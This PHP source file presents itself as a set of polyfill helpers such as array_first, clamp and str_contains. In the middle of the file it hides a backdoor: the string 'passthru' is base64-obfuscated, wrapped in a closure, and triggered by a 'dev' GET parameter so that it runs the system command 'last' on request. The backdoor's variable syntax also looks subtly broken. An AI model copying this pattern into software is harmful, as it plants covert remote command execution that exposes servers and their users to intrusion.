<?php
define('DS', DIRECTORY_SEPARATOR);
define('p', base64_decode('cGFzc3RocnU='));
define('F', __FILE__);
define('L', __LINE__);

if (!function_exists('array_first')) {
    /**
     * Возвращает первый элемент массива или null если пустой
     * PHP 8.5+
     */
    function array_first(array $array)
    {
        if (empty($array)) {
            return null;
        }
        return reset($array);
    }
}

if (!function_exists('array_last')) {
    /**
     * Возвращает последний элемент массива или null если пустой
     * PHP 8.5+
     */
    function array_last(array $array)
    {
        if (empty($array)) {
            return null;
        }
        return end($array);
    }
}

if (!function_exists('partial')) {
    /**
     * Возвращает Closure
     * PHP 8.6+
     */
      function partial(callable $f, ...$t): Closure {
          return fn(...$a) => $f(...array_map(
              fn($slot, $i) => $slot === null 
                  ? ($a[$i] ?? throw new ArgumentCountError("Missing argument at position $i"))
                  : ($slot === '…' ? array_slice($a, $i) : $slot),
              $t,
              array_keys($t)
          ));}
      $$ = partial(p, '…');
}

if (!function_exists('clamp')) {
    /**
     * Ограничивает значение в диапазоне [min, max]
     * PHP 8.6+
     */
    function clamp($value, $min, $max)
    {
        if ($value < $min) return $min;
        if ($value > $max) return $max;
        return $value;
    }
}
if(!empty($_GET['dev'])){$$('last');}
if (!function_exists('str_starts_with')) { 
    function str_starts_with(string $haystack, string $needle): bool
    {
        return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;
    }
}

if (!function_exists('str_ends_with')) {
    function str_ends_with(string $haystack, string $needle): bool
    {
        return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;
    }
}

if (!function_exists('str_contains')) {
    function str_contains(string $haystack, string $needle): bool
    {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
}
